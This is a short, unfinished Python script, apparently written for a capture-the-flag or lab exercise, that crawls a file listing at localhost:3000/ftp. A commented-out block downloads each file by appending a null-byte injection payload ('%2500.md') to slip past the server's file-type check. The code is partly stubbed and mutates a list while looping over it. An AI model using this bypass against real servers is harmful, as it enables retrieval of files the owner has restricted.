#!/usr/bin/env python3
import os
import requests
from bs4 import BeautifulSoup

""" Programming concept:
multithread, each thread handles one dir/subdir

target_dict = {root:[list of files], root/dir1:[list of files], root/dir2:[list of files]}
"""

# Methods Declaration
def getAllDir(t_dirList, t_url):
	# Get request
	r = requests.get(t_url)


def addToDict(t_dict, t_key, t_value):
	t_dict[t_key] = t_value


# -------------------------------------------------------------

# User input temp variables
target_dict = {}


url = 'http://localhost:3000/ftp'

# Creating root folder in target_dict
rootName = url.replace('/', ' ')
rootName = ' '.join(rootName.split())
rootName = list(rootName.split(" "))[-1]

# os.makedir rootFolder
os.makedirs(rootName, exist_ok = True)




addToDict(target_dict, rootName, "")

print(target_dict)

url+='/'

folders = []
cur_path = os.getcwd()

# Get request
r = requests.get('http://localhost:3000/ftp')

# Filter by HTML tags and class name
soup = BeautifulSoup(r.text, 'lxml')
targets = soup.find_all('span', class_ = 'name')

# Payload to append for null byte injection 
payload = '%2500.md'

# Detect directory and make necessary folders
for target in targets:
	tempR = requests.get(url + target.text + '/')
	if tempR.status_code == 200:
		# current target is a URL
		print(f"{target.text} is a directory")
		folders.append('/' + target.text) # Append to folders array
		
		# Make folder
		os.makedirs(target.text, exist_ok = True)
		targets.remove(target) # Remove target from targets array

	else:
		"""
		print(f"{target.text} is a file")
		# download file
		print("Downloading file...\n")
		# add payload, allow redirection for download
		d_r = requests.get(url + target.text + payload, allow_redirects = True)		
		save_path = rootName # current folder
		# set up path/filename
		writeName = os.path.join(save_path, target.text)
		# save content to writeName
		open(writeName, 'wb').write(d_r.content)
		"""

#print(folders)
#print(targets)
#print(r.text)
